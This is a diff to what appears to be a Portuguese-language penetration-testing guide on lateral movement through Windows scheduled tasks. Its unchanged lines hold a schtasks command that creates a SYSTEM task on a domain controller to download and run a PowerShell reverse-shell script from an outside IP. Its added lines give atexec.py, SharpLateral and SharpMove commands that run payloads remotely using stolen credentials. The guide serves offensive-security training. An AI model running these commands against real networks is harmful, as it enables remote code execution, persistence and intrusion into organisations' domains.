@@ -18,9 +18,17 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
+Você pode usar **Impacket's `atexec.py`** para executar comandos em sistemas remotos usando o comando AT. Isso requer credenciais válidas (nome de usuário e senha ou hash) para o sistema alvo.
+```bash
+atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
+```
 Você também pode usar [SharpLateral](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
+```
+Você pode usar [SharpMove](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
 ```
 Mais informações sobre o [**uso de schtasks com silver tickets aqui**](../active-directory-methodology/silver-ticket.md#host).
 
